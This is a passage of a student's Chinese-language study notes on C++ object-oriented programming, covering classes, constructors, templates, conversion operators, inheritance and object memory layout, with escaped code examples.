岁&quot; &lt;&lt; std::endl;    &#125;private:    std::string name;  // 姓名    int age;           // 年龄&#125;;// 2. 主函数 - 使用Student类int main() &#123;    // 创建Student对象    Student stu1(&quot;张三&quot;, 18);    Student stu2(&quot;李四&quot;, 20);        // 调用对象的方法    stu1.show();    stu2.show();        // 张三过生日    stu1.birthday();    stu1.show();        return 0;&#125;\n\n\n\ncpp和h文件定义类\n//这个和传统的类不同，主要就是类的中心是h文件而并非cpp文件，在h文件中声明了类的属性和方法，在调用类的方法的时候是先去访问h文件，然后通过在对应cpp文件中去寻找方法的实现，对于没有在h文件中声明的方法即使在cpp中实现了也没用。//student.h#ifndef STUDENT_H  // 防止重复包含#define STUDENT_H#include &lt;string&gt;  // 需要用到string类型class Student &#123;public:    // 构造函数声明    Student(std::string name, int age);        // 成员函数声明（只有函数原型，没有实现）    void introduce();      // 自我介绍    void haveBirthday();   // 过生日    std::string getName(); // 获取姓名    private:    // 成员变量声明（不暴露具体值）    std::string name_;     // 姓名（私有）    int age_;              // 年龄（私有）&#125;;#endif // STUDENT_H//student.cpp#include &quot;student.h&quot;  // 必须包含自己的头文件#include &lt;iostream&gt;   // 需要用到cout// 1. 构造函数实现// 格式：类名::构造函数名(参数)Student::Student(std::string name, int age)     : name_(name), age_(age)  // 初始化列表（推荐写法）&#123;    // 构造函数体    std::cout &lt;&lt; &quot;创建学生: &quot; &lt;&lt; name_ &lt;&lt; std::endl;&#125;// 2. 成员函数实现// 格式：返回类型 类名::函数名(参数)void Student::introduce() &#123;    std::cout &lt;&lt; &quot;大家好，我是&quot; &lt;&lt; name_               &lt;&lt; &quot;，今年&quot; &lt;&lt; age_ &lt;&lt; &quot;岁。&quot; &lt;&lt; std::endl;&#125;void Student::haveBirthday() &#123;    age_++;  // 年龄加1    std::cout &lt;&lt; name_ &lt;&lt; &quot;过生日啦！现在&quot; &lt;&lt; age_ &lt;&lt; &quot;岁。&quot; &lt;&lt; std::endl;&#125;std::string Student::getName() &#123;    return name_;  // 返回姓名&#125;\n\n\n\n\n\n\n\n1.定义对象C++中对象的基本实例化方法要简单一点，直接像变量一样直接通过类型写即可，不像Java中还需要new\nBox Box1;          // 声明 Box1，类型为 BoxBox Box2;          // 声明 Box2，类型为 Box\n\n可以直接通过include语句声明类之后直接通过Box类型进行声明\n访问数据成员\n这个所有语言都一样，无论结构体还是对象直接通过箭头和点访问即可\n示例：\n#include &lt;iostream&gt; using namespace std; class Box&#123;   public:      double length;   // 长度      double breadth;  // 宽度      double height;   // 高度      // 成员函数声明      double get(void);      void set( double len, double bre, double hei );&#125;;// 成员函数定义double Box::get(void)&#123;    return length * breadth * height;&#125; void Box::set( double len, double bre, double hei)&#123;    length = len;    breadth = bre;    height = hei;&#125;int main( )&#123;   Box Box1;        // 声明 Box1，类型为 Box   Box Box2;        // 声明 Box2，类型为 Box   Box Box3;        // 声明 Box3，类型为 Box   double volume = 0.0;     // 用于存储体积    // box 1 详述   Box1.height = 5.0;    Box1.length = 6.0;    Box1.breadth = 7.0;    // box 2 详述   Box2.height = 10.0;   Box2.length = 12.0;   Box2.breadth = 13.0;    // box 1 的体积   volume = Box1.height * Box1.length * Box1.breadth;   cout &lt;&lt; &quot;Box1 的体积：&quot; &lt;&lt; volume &lt;&lt;endl;    // box 2 的体积   volume = Box2.height * Box2.length * Box2.breadth;   cout &lt;&lt; &quot;Box2 的体积：&quot; &lt;&lt; volume &lt;&lt;endl;     // box 3 详述   Box3.set(16.0, 8.0, 12.0);    volume = Box3.get();    cout &lt;&lt; &quot;Box3 的体积：&quot; &lt;&lt; volume &lt;&lt;endl;   return 0;&#125;\n\n输出结果\nBox1 的体积：210Box2 的体积：1560Box3 的体积：1536\n\n需要注意的是，私有的成员和受保护的成员不能使用直接成员访问运算符 (.) 来直接访问。我们将在后续的教程中学习如何访问私有成员和受保护的成员。\n2.构造和析构函数使用和其他语言都是一样的，构造函数都是在对象被定义的时候调用用来初始化，析构函数则是在每个对象被销毁之前进行调用，只需要记住语法用来期末考试就行了\n构造函数分为无参构造函数，有参构造函数，默认参数构造函数。主要就是默认参数构造函数，这个函数在无参的时候会使用默认的参数，在有参的时候则会使用输入的参数\n构造函数示例：\n//h文件声明    // 默认参数只能在声明中指定，不能同时在定义中指定    Book(const std::string&amp; title = &quot;未命名&quot;,          const std::string&amp; author = &quot;未知作者&quot;,          double price = 0.0,          int pages = 0);//cpp文件中实现Book::Book(const std::string&amp; title,            const std::string&amp; author,            double price,            int pages)    : title_(title), author_(author), price_(price),       pages_(pages), pagesRead_(0)  // 初始化列表&#123;    std::cout &lt;&lt; &quot;创建图书: &quot; &lt;&lt; title_ &lt;&lt; std::endl;&#125;//这是在头文件中声明，那在单独的cpp文件类中我们是可以直接写默认参数的，但是我们需要确保默认参数的构造函数中默认参数只声明一次//单独cpp文件中    Student(const std::string&amp; name = &quot;匿名&quot;, int age = 18)         : name_(name), age_(age) //这样可以直接将name和age赋值给name_和age_    &#123;        std::cout &lt;&lt; &quot;创建学生: &quot; &lt;&lt; name_ &lt;&lt; std::endl;    &#125;\n\n\n\n析构函数的特点是没有参数和返回值，在对象被销毁的时候调用\nclass MyClass &#123;public:    ~MyClass();  // 析构函数：类名前加 ~&#125;;\n\n示例\n~Student() &#123;    delete[] scores_;  // 释放动态内存    std::cout &lt;&lt; name_ &lt;&lt; &quot; 对象被销毁&quot; &lt;&lt; std::endl;&#125;\n\n我懒得去知道对象到底在哪些请况中会被销毁。\n3.对象数组与指针虽然说对象数组就是每一个元素都是同一类型的对象的数组，但是和普通数组的区别在于对象数组需要进行初始化\n//全部使用默认参数Student students[5]; // 使用不同的构造函数初始化每个元素Student students[3] = &#123;    Student(&quot;张三&quot;, 85),    // 调用参数构造函数    Student(&quot;李四&quot;, 92),    // 调用参数构造函数      Student(&quot;王五&quot;, 78)     // 调用参数构造函数&#125;;// 部分指定，其余使用默认构造函数Student students[5] = &#123;    Student(&quot;张三&quot;, 85),  // 第一个元素    Student(&quot;李四&quot;, 92)   // 第二个元素    // 后三个元素使用默认构造函数&#125;;//还可以自动推断出元素数量// C++11支持的新语法Student students[3] &#123;    &#123;&quot;张三&quot;, 85&#125;,    &#123;&quot;李四&quot;, 92&#125;,    &#123;&quot;王五&quot;, 78&#125;&#125;;// 自动推断数组大小Student students[] &#123;    &#123;&quot;张三&quot;, 85&#125;,    &#123;&quot;李四&quot;, 92&#125;,    &#123;&quot;王五&quot;, 78&#125;  // 自动推断数组大小为3&#125;;\n\n\n\n对象指针语法\n//声明方式类名*对象指针名;//赋值方式对象指针名0=&amp;对象名;//使用对象指针和对象名都可以访问类的成员，其中使用对象指针的访问方式为对象指针名-&gt;类的成员;(*对象指针名).类的成员\n\n\n\nthis指针\nthis指针就是一个只可以在当前类中使用，用来在执行代码的时候指向当前对象的一个指针。this指针的类型是ClassName* const，我们也可以使用对象指针的语法去使用this指针\n使用示例\nclass Person &#123;private:    string name;    int age;public:    Person(string name, int age) &#123;        this-&gt;name = name;  // this-&gt;name 是成员变量，name 是参数        this-&gt;age = age;    &#125;&#125;;//返回当前对象class Calculator &#123;private:    int value;public:    Calculator&amp; add(int n) &#123;        value += n;        return *this;  // 返回当前对象的引用    &#125;&#125;;//我们需要注意类的静态方法是代码开始运行之前就加载了的，可以直接通过类名进行调用，是不能使用this指针的class MyClass &#123;    static void func() &#123;        // this-&gt;x = 10;  // 错误！静态函数没有 this    &#125;&#125;;\n\n\n\n4.对象的赋值与复制对象的赋值\n对象之间也可以像那些数据类型一样，同类型之间的可以使用等号进行赋值，相应的两个对象之间进行了赋值，但是其仍然是分离的\n语法\nStudent student1;Student student2;student1=student2;\n\n之所以可以通过等号进行对象之前的赋值，这是因为在执行的时候C++自动生成了一个&#x3D;的运算符重载函数，其参数就是对应的对象。\n对象的赋值发生在两个对象都被定义的时候，拿一个对象去覆盖另外一个对象。\n对象的复制\n由一个对象去复制另外一个对象，这个听起来就知道是发生在一个对象被创建的时候。\n于是对象的复制和赋值不同的地方在于，对象的复制发生在对象定义的时候，而不是两个对象都被定义好的时候\n语法\nStudent student1;Student student2=student1;\n\n这个等号也是经过运算符重载的结果\n如果不使用等号也可以通过构造函数去复制，构造函数的写法就是把每一个成员都进行一次赋值，感觉没有&#x3D;好用\nStudent student1;Student student2(student1);\n\n\n\n\n\n5.友元函数友元函数是一个不是类成员的普通函数，但被授予访问该类私有（private）和保护（protected）成员的权限。\n关键点：\n\n不是类成员函数\n可以访问类的私有和保护成员\n需要在类内部声明为 friend\n\n友元函数的特性\n\n不是成员函数\n没有 this 指针\n不能通过 obj-&gt;friendFunc() 调用，只能普通函数调用\n\n\n可以访问私有&#x2F;保护成员\n友元权限只授予声明它的类\n不属于继承体系的多态\n\n\n对类的封装破坏有限\n只能访问声明它的类\n不会自动扩展到其他类\n\n\n可以是全局函数，也可以是类的成员函数的友元\n全局函数或其他类的函数都可以被声明为友元\n\n\n\n语法\nclass A &#123;private:    int x;public:    A(int v) : x(v) &#123;&#125;    friend void showX(const A&amp; a);  // 声明友元函数&#125;;// 定义友元函数void showX(const A&amp; a) &#123;    std::cout &lt;&lt; &quot;x = &quot; &lt;&lt; a.x &lt;&lt; std::endl;&#125;//在需要访问的类中以friend声明，然后再进行普通函数实现，即使是在类中实现也不是类的成员，而是一个普通函数。然后参数需要是目标类对象\n\n常见使用到的地方是运算符重载\nclass Vec &#123;private:    int x, y;public:    Vec(int x, int y) : x(x), y(y) &#123;&#125;    friend Vec operator+(const Vec&amp; a, const Vec&amp; b);&#125;;Vec operator+(const Vec&amp; a, const Vec&amp; b) &#123;    return Vec(a.x + b.x, a.y + b.y);  // 访问私有成员&#125;\n\n我们需要注意的是友元函数并不是一个具体的函数，而是一个普通函数被声明为了友元函数，其中友元函数必须是一个普通函数，不能被对象-&gt;函数的形式调用，即使是在类中被实现了也不行\nclass A &#123;private:    int x;public:    // 在类内定义友元函数    friend void showX(const A&amp; a) &#123;        std::cout &lt;&lt; &quot;x = &quot; &lt;&lt; a.x &lt;&lt; std::endl;    &#125;&#125;;//调用方式：showX(a)，而不是 a.showX()//其实就相当于在类中声明然后在类外实现\n\n\n\n\n\n6.函数模板函数模板不是函数，而是“生成函数的规则”。\n当我们遇到这种请况的时候，假如要写一个各种数据类型相加后的结果的函数。如果按照正常写法，就会出现int、float、double类型都有函数，这会导致代码量十分大。我们为了解决这个问题，可以使用函数的模板，可以在面对不同类型的参数的时候执行同一套逻辑\n示例\ntemplate&lt;typename T&gt;//函数模板的声明T add(T a, T b) &#123;    return a + b;&#125;//多个不同参数template&lt;typename T1, typename T2&gt;auto multiply(T1 a, T2 b) -&gt; decltype(a * b) &#123; //auto表示返回类型在后面指定 decltype返回参数的类型    return a * b;&#125;\n\n使用方法就和正常函数一样，只不过编译器会自己根据代码传入的参数去生成然后执行对应的函数\n实例\n// 模板声明template&lt;typename T&gt;          // 或 template&lt;class T&gt;返回类型 函数名(参数列表);// 示例template&lt;typename T&gt;T add(T a, T b) &#123;    return a + b;&#125;// 多个模板参数template&lt;typename T1, typename T2&gt;auto multiply(T1 a, T2 b) -&gt; decltype(a * b) &#123;    return a * b;&#125;// 使用int main() &#123;    auto result1 = add(5, 3);        // T = int    auto result2 = add(2.5, 3.7);    // T = double        auto result3 = multiply(2, 3.5); // T1 = int, T2 = double        return 0;&#125;\n\n然后函数模板也不一定每一次都需要参数，没有参数来对T进行类型判断，我们该如何进行类型判断呢，我们可是使用模板实参的显示指定，就是指定函数执行时T的类型\ntemplate&lt;typename T&gt;T getDefault() &#123;    return T();  // 返回类型T的默认值&#125;int main() &#123;    // 方式1：隐式推导（无法用于无参函数！）    // auto x = getDefault();  // 错误！编译器无法推导T        // 方式2：显式指定模板参数    auto x = getDefault&lt;int&gt;();     // 显式指定 T = int    auto y = getDefault&lt;double&gt;();  // 显式指定 T = double    auto z = getDefault&lt;std::string&gt;(); // 显式指定 T = std::string        std::cout &lt;&lt; &quot;int默认值: &quot; &lt;&lt; x &lt;&lt; std::endl;       // 0    std::cout &lt;&lt; &quot;double默认值: &quot; &lt;&lt; y &lt;&lt; std::endl;    // 0.0    std::cout &lt;&lt; &quot;string默认值: &quot; &lt;&lt; z &lt;&lt; std::endl;    // &quot;&quot; (空字符串)        return 0;&#125;\n\n\n\n然后函数模板的参数也可以不是模板类型，可以提前规定好类型\ntemplate&lt;typename T, int N&gt;T scale(T value) &#123;    return value * N;&#125;scale&lt;int, 3&gt;(5)\n\n使用的时候不是传递类型，而是传递一个符合类型的值\n7.类的模板没想到不止有函数模板还有类的模板，考个试也太难了吧。\n类模板不是类，而是“生成类的蓝图（规则）”\n和函数模板一样，都是为了解决相同操作，不同类型而造成代码量过大的问题。\n我们先来看一个简单的类模板\ntemplate &lt;typename T&gt;class Box &#123;public:    T value;    Box(T v) : value(v) &#123;&#125;&#125;;//使用Box&lt;int&gt; a(10);Box&lt;double&gt; b(3.14);\n\n我们可以看到类模板和函数模板不同的地方就在于，其模板不仅可以用来规定函数的返回值和参数，还可以指定类的属性的类型。\n相应的和模板函数一样，如果是有参就可以自动判断模板类型，无参则需要我们在类名后面使用尖括号指定模板类型。然后这个示例代码是使用了构造函数去传入参数进行初始化，不在Box后面写类型也不会编译错误，但是如果没有构造函数，或者构造函数没有使用参数确定所有模板类型就需要在使用类模板的时候进行声明。\n类模板的成员函数\n类模板整体在使用时生成，但成员函数是“按需生成”\ntemplate &lt;typename T&gt;class A &#123;public:    void f() &#123; /* ... */ &#125;    void g() &#123; /* ... */ &#125;&#125;;A&lt;int&gt; a;a.f(); // 只生成 f&lt;int&gt;\n\n\n\n我们还需要注意类模板中成员函数的写法\n1️⃣ 类内定义（简单）\ntemplate &lt;typename T&gt;class Box &#123;public:    void show() &#123;        std::cout &lt;&lt; value &lt;&lt; std::endl;    &#125;&#125;;\n\n\n\n2️⃣ 类外定义（必须写全模板参数）\ntemplate &lt;typename T&gt;class Box &#123;public:    void show();&#125;;template &lt;typename T&gt;void Box&lt;T&gt;::show() &#123;    std::cout &lt;&lt; value &lt;&lt; std::endl;&#125;//Box&lt;T&gt;:: 不能省\n\n\n\n和函数模板一样，类模板也支持非类型参数\ntemplate &lt;typename T, int N&gt;class Array &#123;    T data[N];&#125;;\n\n使用的时候也需要给一个符合类型的值\n模板必须写在头文件中\n我们函数的模板和类模板都必须写在头文件中而不是cpp文件\n这是因为，模板不是任何有效的类或者函数，而是一套生成规则。\n也就是说面对cpp文件中的类和函数，编译器都是可以生成对应的机器码的。但是面对cpp文件中写了模板的实现的话\n// foo.htemplate &lt;typename T&gt;void f(T x);// foo.cpptemplate &lt;typename T&gt;void f(T x) &#123;    // ...&#125;// main.cppf(10);\n\n编译器视角：\n\n编译 main.cpp\n看到 f&lt;int&gt; 需要实例化\n❌ 看不到模板定义\n\n\n编译失败 &#x2F; 链接失败\n\n于是实际流程应该是编译器看见模板调用，去h文件中看到模板的规则，然后再在cpp文件中去生成模板的实现，所以我们需要把规则写到h文件中让编译器可以看到规则。\n因为：使用模板的地方，必须“看到模板的完整定义”，才能实例化。\n头文件的作用：\n\n被 #include\n在使用点展开\n模板定义对编译器可见\n\n类模板也是一样，也需要知道规则后才能去生成对应的类\n8.用户自定义类型转换运算符假如我们的对象被赋值给一个字符串，这个时候可能会编译报错，但是我们使用用户自定义类型转换运算符可以避免报错并返回一个我们指定的字符串\n我们之前学php的时候，php的类有各种魔术方法，对应对象被各种特殊操作的时候进行应对，比如__toString魔术方法，在对象被作为字符串被调用的时候会调用__toString方法去返回一个字符串\n用户自定义类型转换运算符是一种特殊的成员函数，告诉编译器如何将你的类对象转换为其他类型。\n语法\noperator type() [const] [volatile] [&amp;] [&amp;&amp;] [noexcept] [-&gt; trailing-return-type] &#123;    // 转换逻辑&#125;//返回的必须是type类型 //这里面const的意思是允许const 修饰的对象进行类型转换//其他的选项我感觉考试不会考到// 实际例子class Example &#123;public:    // 转换为int    operator int() const &#123;        return 42;    &#125;        // 转换为double（const版本）    operator double() const &#123;        return 3.14;    &#125;        // 转换为string（可能抛出异常）    operator std::string() const &#123;        return &quot;example&quot;;    &#125;        // C++11：explicit转换运算符    explicit operator bool() const &#123;        return true;    &#125;        // C++11：引用限定符    operator int&amp;() &amp; &#123;  // 仅当对象是左值时可用        static int value = 100;        return value;    &#125;        operator int&amp;&amp;() &amp;&amp; &#123;  // 仅当对象是右值时可用        return 200;    &#125;&#125;;\n\n\n\n示例\nclass MyClass &#123;    // 数据成员...public:    // 转换运算符声明    operator TargetType() const;&#125;;// 定义MyClass::operator TargetType() const &#123;    // 返回TargetType类型的值&#125;\n\n其中这个函数有些规则\n\n没有返回类型声明\n必须是成员函数\n没有参数\n不是静态函数\n\n使用方式\n隐式转换（默认行为）\nclass ImplicitExample &#123;    double value;public:    ImplicitExample(double v) : value(v) &#123;&#125;        // 隐式转换到double    operator double() const &#123;        return value;    &#125;        // 隐式转换到int    operator int() const &#123;        return static_cast&lt;int&gt;(value);    &#125;&#125;;void testImplicit() &#123;    ImplicitExample obj(3.14);        // 自动隐式转换    double d = obj;      // 调用 operator double()    int i = obj;         // 调用 operator int()    float f = obj;       // 先转double，再转float        // 在表达式中隐式转换    double sum = obj + 2.5;    // obj转double，然后相加    bool greater = obj &gt; 3.0;  // obj转double，然后比较        // 函数参数隐式转换    void printDouble(double x);    printDouble(obj);    // 自动转换        // 但可能引起歧义    void process(int x);    void process(double x);    // process(obj);  // 错误！ambiguous call&#125;\n\n\n\n显式转换（C++11引入explicit）不是由编译器自己去选择类型而是通过在类前面加static_cast&lt;int&gt;指定调用哦个那个转换函数\nclass ExplicitExample &#123;    int value;public:    ExplicitExample(int v) : value(v) &#123;&#125;        // explicit转换运算符    explicit operator int() const &#123;        return value;    &#125;        explicit operator double() const &#123;        return static_cast&lt;double&gt;(value);    &#125;        explicit operator bool() const &#123;        return value != 0;    &#125;&#125;;void testExplicit() &#123;    ExplicitExample obj(42);        // 错误！不能隐式转换    // int i = obj;    // double d = obj;    // if (obj == 42) &#123; ... &#125;        // 正确：显式转换    int i = static_cast&lt;int&gt;(obj);    double d = static_cast&lt;double&gt;(obj);    bool b = static_cast&lt;bool&gt;(obj);        // 例外：在条件中，explicit operator bool()可以被隐式调用    if (obj) &#123;  // 合法！调用 explicit operator bool()        std::cout &lt;&lt; &quot;obj is truthy&quot; &lt;&lt; std::endl;    &#125;        // 但不能用在其他需要bool的上下文    // bool flag = obj;  // 错误！    // while (obj) &#123; ... &#125;  // 在while中是合法的    // for (; obj; ) &#123; ... &#125;  // 在for中是合法的    // do &#123; ... &#125; while (obj);  // 在do-while中是合法的    // !obj, obj &amp;&amp; true, obj || false  // 逻辑运算符中是合法的        // 这是C++标准对explicit operator bool()的特殊处理&#125;\n\n\n\n9.转换构造函数转换构造函数是C++中一种特殊的构造函数，它允许从其他类型隐式或显式地构造类对象。这是C++类型转换机制的重要组成部分。\n转换构造函数是能够用单个参数调用的构造函数（或多个参数，但第一个参数之后的所有参数都有默认值）。它定义了如何从参数类型转换到类类型。\n有了转换构造函数我们就可以在定义对象的时候实现这种操作\nStringWrapper s3 = &quot;Implicit&quot;;    // const char* -&gt; StringWrapperStringWrapper s4 = 42;            // int -&gt; StringWrapperStringWrapper s5 = 3.14159;       // double -&gt; StringWrapper\n\n\n\n示例\nclass MyClass &#123;public:    // 转换构造函数：从int构造MyClass    MyClass(int value) &#123;        // 构造逻辑    &#125;        // 转换构造函数：从double构造MyClass    MyClass(double value, int extra = 0) &#123;        // 注意：第二个参数有默认值，所以可以单参数调用    &#125;        // 不是转换构造函数：需要两个明确参数    MyClass(int a, int b) &#123;  // 不是转换构造函数        // 需要两个int，不能单参数调用    &#125;&#125;;\n\n使用方法\n#include &lt;iostream&gt;#include &lt;string&gt;class StringWrapper &#123;    std::string data;    public:    // 转换构造函数：从C风格字符串    StringWrapper(const char* str) : data(str) &#123;        std::cout &lt;&lt; &quot;Converted from const char*&quot; &lt;&lt; std::endl;    &#125;        // 转换构造函数：从std::string    StringWrapper(const std::string&amp; str) : data(str) &#123;        std::cout &lt;&lt; &quot;Converted from std::string&quot; &lt;&lt; std::endl;    &#125;        // 转换构造函数：从int（转换为字符串）    StringWrapper(int number) : data(std::to_string(number)) &#123;        std::cout &lt;&lt; &quot;Converted from int&quot; &lt;&lt; std::endl;    &#125;        // 转换构造函数：从double    StringWrapper(double number, int precision = 2) &#123;        std::ostringstream oss;        oss &lt;&lt; std::fixed &lt;&lt; std::setprecision(precision) &lt;&lt; number;        data = oss.str();        std::cout &lt;&lt; &quot;Converted from double&quot; &lt;&lt; std::endl;    &#125;        const std::string&amp; get() const &#123; return data; &#125;&#125;;void printString(const StringWrapper&amp; sw) &#123;    std::cout &lt;&lt; &quot;String: &quot; &lt;&lt; sw.get() &lt;&lt; std::endl;&#125;int main() &#123;    // 显式构造    StringWrapper s1(&quot;Hello&quot;);        // 直接调用构造函数    StringWrapper s2 = StringWrapper(&quot;World&quot;);  // 显式转换        // 隐式转换（调用转换构造函数）    StringWrapper s3 = &quot;Implicit&quot;;    // const char* -&gt; StringWrapper    StringWrapper s4 = 42;            // int -&gt; StringWrapper    StringWrapper s5 = 3.14159;       // double -&gt; StringWrapper        // 函数参数隐式转换    printString(&quot;Test&quot;);              // const char* -&gt; StringWrapper    printString(100);                 // int -&gt; StringWrapper    printString(2.71828);             // double -&gt; StringWrapper        return 0;&#125;\n\n\n\n转换构造函数和普通构造函数的区别\n1. 参数数量要求不同\n普通构造函数参数可以随便，但是转换构造函数必须可以单参调用，多出来的参数必须有默认值确保可以单参调用。\nclass MyClass &#123;public:    // 普通构造函数：可以是任意参数数量    MyClass() &#123; &#125;                          // 默认构造函数    MyClass(int a, int b) &#123; &#125;              // 两参数构造函数    MyClass(int a, int b, int c) &#123; &#125;       // 三参数构造函数        // 转换构造函数：必须能单参数调用    MyClass(int a) &#123; &#125;                     // ✓ 转换构造函数    MyClass(double d, int extra = 0) &#123; &#125;   // ✓ 转换构造函数（有默认参数）    MyClass(const char* s, int n = -1) &#123; &#125; // ✓ 转换构造函数        // 以下不是转换构造函数：    // MyClass(int a, int b, int c = 0)   // ✗ 虽然c有默认值，但仍需至少两个参数&#125;;\n\n\n\n2.隐式转换的触发\n我们知道构造函数只能在，实例化对象的时候去调用。但是转换构造函数可以有多种触发方式\nclass Distance &#123;    double meters;public:    // 转换构造函数（允许隐式转换）    Distance(double m) : meters(m) &#123;        std::cout &lt;&lt; &quot;Converting from double: &quot; &lt;&lt; m &lt;&lt; std::endl;    &#125;        // 普通两参数构造函数（不允许隐式转换）    Distance(double m, const std::string&amp; unit) &#123;        if (unit == &quot;km&quot;) meters = m * 1000;        else if (unit == &quot;cm&quot;) meters = m / 100;        else meters = m;        std::cout &lt;&lt; &quot;Explicit construction&quot; &lt;&lt; std::endl;    &#125;&#125;;void processDistance(Distance d) &#123;    std::cout &lt;&lt; &quot;Processing distance&quot; &lt;&lt; std::endl;&#125;int main() &#123;    // 转换构造函数允许隐式转换    Distance d1 = 100.0;           // ✓ 隐式：double -&gt; Distance    Distance d2 = 200;             // ✓ 隐式：int -&gt; double -&gt; Distance        processDistance(500.0);        // ✓ 隐式转换参数        // 普通构造函数需要显式调用    Distance d3(1000, &quot;km&quot;);       // ✓ 显式调用    // Distance d4 = (1000, &quot;km&quot;); // ✗ 错误！不能隐式转换        // 使用列表初始化（C++11）    Distance d5 = &#123;1500, &quot;m&quot;&#125;;     // ✓ C++11: 列表初始化    Distance d6&#123;2000, &quot;m&quot;&#125;;        // ✓ 直接列表初始化        return 0;&#125;\n\n\n\n\n\n\n\n\n\n2.类的继承面向对象程序设计中最重要的一个概念是继承。继承允许我们依据另一个类来定义一个类，这使得创建和维护一个应用程序变得更容易。这样做，也达到了重用代码功能和提高执行效率的效果。\n当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类，新建的类称为派生类。\n// 基类class Animal &#123;    // eat() 函数    // sleep() 函数&#125;;//派生类class Dog : public Animal &#123;    // bark() 函数&#125;;\n\n然后就是和其他的一样，一个类可以同时继承多个类，但是不能有同名的方法和属性上的冲突，否则就是二义性了\n1.类在内存中的分布这已经是我学的好几遍面向对象编程了，每次都要看一遍继承这些操作，我想在这次学习一下面向对象编程中的内存分布，来从底层的角度理解这些操作。\nC++ 的类，本质是“内存布局 + 访问规则 + 编译期生成的代码”。这也就好像解释了后面我们说为什么类是不占用内存的，占用内存的是对象。这也就解释了为什么类是无法直接执行方法的，直接执行的方法需要使用静态修饰提前加载就可以直接调用了。\n虽然我还不知道在编译过程中发生了什么才能够即使不为类提供内存也能够正常运行。为了解决这个问题我们还需要进一步了解一下代码到底是如何从写到编译然后到运行期间到底发生了什么\n\n类 本身不占内存\n对象 才占内存\n成员函数 不在对象里\n\n记住这 3 句，后面所有内容都会顺。\n对象\nC++ 的对象，本质上就是一块连续的内存\n类 ≈ 数据布局规则 对象 ≈ 按规则分配的一段内存\nclass A &#123;public:    int x;    int y;&#125;;//一个对象在内存中分布就是直接储存属性，至于方法是存放在代码区的| x | y |//没有魔法\n\n\nsizeof(A) == 8（通常）\na 是一段连续内存\n成员顺序 &#x3D; 声明顺序（⚠️不是初始化列表顺序）也就是定义对象时就为属性分配内存了，而不是往里面写才有内存\n\n方法\n这个时候我们就有疑惑了，既然对象在内存中没有储存着方法，那方法又是如何调用的，方法大多是都是需要对当前对象进行操作的。\n对于我们这样的一个对象\nclass A &#123;public:    int x;    void f();&#125;;//即使有一个函数，内存还是只有x 我们使用sizeof来判断还是4| x |\n\n说明\n\n成员函数不占对象内存\nf() 在 代码区\n\n调用时编译器偷偷干了这件事：\na.f();// 等价于f(&amp;a);\n\n也就是说我们调用方法的时候是在代码区找到这个方法，然后在通过对象调用时会将指向对象的指针（感觉和this指针一样）传递给方法，代码区的方法来源于编译代码的时候将类中的方法存到了代码区。\n👉 所以成员函数的本质：普通函数 + 隐式 this 指针\n继承\nclass A &#123;public:    int x;&#125;;class B : public A &#123;public:    int y;&#125;;//其实就是在存放B对象的时候再提前存放一个A对象，后面再跟上B对象额外写的，然后在使用的时候B的数据会对前面的A进行覆盖这就是重写，代码区应该也是这样的| A::x | B::y |class A &#123; int a; &#125;;class B &#123; int b; &#125;;class C : public A, public B &#123;    int c;&#125;;//多继承只不过是多了一个对象而已，这个图只是看一下，实际上B和C是同级别的，运行的时候应该会进行二义性校验| A::a | B::b | C::c |//还需要说一下，假如继承顺序是A-&gt;B-&gt;C其中C的内存分布是| A::a | B::b | C::c |//这也就是为什么C指针也可以转化为A指针\n\n由于我们在继承的时候由于前面其实会跟着基类的一个对象，于是我们的派生类也可以随时转换为基类的指针\nC c;B* pb = &amp;c;  // 编译器自动偏移\n\n\n\n虚继承\n我承认我是后面学到虚继承的时候才想到要学习一下内存使用，但是现在还是一知半解，希望这肤浅的理解水平后面够用。\nclass A &#123; int x; &#125;;class B : virtual public A &#123;&#125;;class C : virtual public A &#123;&#125;;class D : public B, public C &#123;    int y;&#125;;//虚继承就相当于共享基类，一个类只有一个虚基类，所有虚继承的类都会指向那个虚基类| B 子对象 | C 子对象 | A(虚基类) | D::y |\n\n我们从这里也可以看到，最后这个虚基类其实是由最后的派生类（最后是多继承不是虚继承）负责的。\n至于其他复杂一点的操作，比如重写等操作，我感觉也是基于这种内存储存实现的。这个基本上使用不到，只是为了理解。\n2.派生类C++有一个不同于其他语言的特性就是，在进行继承的时候子类会带有一个修饰符，这个修饰符不像Java那样是修饰子类的，因为C++在定义类的时候类是不需要修饰符的，所有类都是全局访问，这个修饰符主要就是会修改一些基类中原来的修饰符。\n具体情况就是从public到private范围小的会覆盖范围大的修饰符，也就是protected修饰的时候Animal类中的public修饰的全部变为了protected\nclass Base &#123;public:    int publicVar;protected:    int protectedVar;private:    int privateVar;  // 不可访问，无论何种继承&#125;;// 1. 公有继承 (public inheritance) - &quot;是一个&quot;关系class DerivedPublic : public Base &#123;    // publicVar → 仍为 public    // protectedVar → 仍为 protected    // 继承接口和行为&#125;;// 2. 保护继承 (protected inheritance) - &quot;实现继承&quot;class DerivedProtected : protected Base &#123;    // publicVar → 变为 protected    // protectedVar → 仍为 protected    // 隐藏基类接口，仅继承实现&#125;;// 3. 私有继承 (private inheritance) - &quot;实现继承&quot;，默认class DerivedPrivate : private Base &#123;  // class默认private继承    // publicVar → 变为 private    // protectedVar → 变为 private    // 完全隐藏基类&#125;;// 4. 不加public会怎样？class DerivedWithoutPublic : Base &#123;  // class默认private继承！    // 等价于: class DerivedWithoutPublic : private Base    // publicVar → private (不是public！)    // protectedVar → private (不是protected！)&#125;;\n\n\n\n访问修饰符\n派生类可以访问基类中所有的非私有成员。因此基类成员如果不想被派生类的成员函数访问，则应在基类中声明为 private。\n我们可以根据访问权限总结出不同的访问类型，如下所示：\n\n\n\n访问\npublic\nprotected\nprivate\n\n\n\n同一个类\nyes\nyes\nyes\n\n\n派生类\nyes\nyes\nno\n\n\n外部的类\nyes\nno\nno\n\n\n一个派生类继承了所有的基类方法，但下列情况除外：\n\n基类的构造函数、析构函数和拷贝构造函数。\n基类的重载运算符。\n基类的友元函数。\n\n3.派生类的构造和析构函数我们从继承可以知道派生类是不会继承基类的构造函数和析构函数的，但是我们也知道定义子类的对象在C++中会在内存中也定义一个父类的对象。\n我们平常的话子类在定义对象执行构造函数的时候自动调用父类的构造函数，但是如果父类的构造函数需要参数的话，我们不显示调用去传参就会报错，这个时候我们就必须在子类中获取到父类构造函数需要的参数，然后在子类的构造函数中调用父类的构造方法\n我们来看一下由DS赞助的代码\n#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 基类：模拟一个有实际功能的类class Animal &#123;private:    string name;    int age;    public:    // 构造函数：初始化对象数据    Animal(const 